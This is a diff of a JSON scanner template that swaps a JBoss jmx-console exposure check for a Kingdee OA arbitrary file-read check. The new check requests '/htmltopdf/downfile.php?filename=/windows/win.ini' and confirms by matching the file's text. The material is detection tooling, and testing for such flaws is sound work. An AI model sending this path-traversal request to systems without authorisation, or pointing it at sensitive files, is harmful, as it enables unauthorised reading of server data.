@@ -1,13 +1,13 @@
 {
-    "Name": "jboss-unauth",
-    "Description": "jboss-unauth, unauthorized access vulnerability",
-    "Product": "jboss",
+    "Name": "Kingdee OA V8 V8 File Read",
+    "Description": "Kingdee OA V8 V8 File Read",
+    "Product": "Kingdee OA",
     "author": "chumeng",
     "Request":[
         {
         "Method": "GET",
         "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/jmx-console/",
+        "Uri":"/htmltopdf/downfile.php?filename=/windows/win.ini",
         "Port":"",
         "Data":"",
         "Follow_redirects":"false",
@@ -15,22 +15,19 @@
         "Response":{
         "Check_Steps":"AND",
         "Checks": [
-                {
-                "Operation": "contains", 
-                "Key":"",
-                "Value": "jboss.management.local"
-                }, {
-                    "Operation": "contains", 
-                    "Key":"",
-                    "Value": "jboss.web"
-                    },
-                 {
+            {
+            "Operation": "contains",
+            "Key":"",
+            "Value": "for 16-bit app support"
+            },
+            {
                 "Operation": "code", 
                 "Key":"",
                 "Value": "200"  
-                 }
+             }
         ]
         },
         "Next_decide":""
-                }
-]}
+        }
+            
+    ]}
